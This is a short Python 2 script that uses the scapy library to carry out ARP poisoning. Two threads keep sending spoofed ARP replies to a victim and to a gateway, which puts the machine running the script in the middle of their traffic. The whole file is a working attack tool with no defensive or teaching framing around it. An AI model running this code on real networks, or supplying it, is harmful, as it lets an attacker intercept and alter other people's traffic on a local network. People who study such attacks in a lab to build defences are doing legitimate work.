import threading
import sys
from scapy.all import *

class ARPPoisoning(threading.Thread):
    '''
    Thread to start the ARP packet crafting and sending process.
    '''
    def __init__(self, scrAddress, dstAddress):
        '''
        Received the source and destination address for the ARP packet
        :param scrAddress:
        :param dstAddress:
        '''
        threading.Thread.__init__(self)
        self.srcAddress = scrAddress
        self.dstAddress = dstAddress

    def run(self):
        '''
        Every thread sends an ARP packet to the destination every second
        :return:
        '''
        try:
            arpPacket = ARP(pdst=self.dstAddress, psrc=self.srcAddress)
            print "Poisooning ..."
            send(arpPacket, verbose=False, loop=1)
        except Exception as e:
            #print "Umexpected error: ", sys.exc_info()[0]
            print "Error : %s" % str(e)


def exe_arpSpoofing(victimIP, gatewayIP):
    victim = ARPPoisoning(gatewayIP, victimIP)
    gateway = ARPPoisoning(victimIP, gatewayIP)

    victim.setDaemon(True)
    gateway.setDaemon(False)

    victim.start()
    gateway.start()